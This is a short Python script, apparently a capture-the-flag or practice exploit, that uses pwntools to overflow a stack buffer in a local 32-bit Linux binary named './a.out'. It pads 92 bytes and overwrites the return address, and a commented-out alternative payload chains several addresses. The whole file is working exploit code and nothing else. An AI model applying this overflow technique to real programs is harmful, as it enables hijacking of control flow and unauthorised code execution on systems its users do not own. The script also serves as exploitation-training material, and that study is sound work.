#!/usr/bin/python

from pwn import *
import os

context(arch='i386', os='linux')
binary = './a.out'

#payload = "A"*84 + "\x70\xff\x19\x00"  +  "\x84\x10\x40\x00" + "B"*68 + "\x90\x12\x40\x00"
payload = "A"*92 + "\xC5\x84\x04\x08"

elf = ELF(binary)

proc2 = process(binary)
info("send payload?")
pause()
proc2.sendline(payload)
r = proc2.recvline()
print(r)
proc2.wait()
proc2.close()


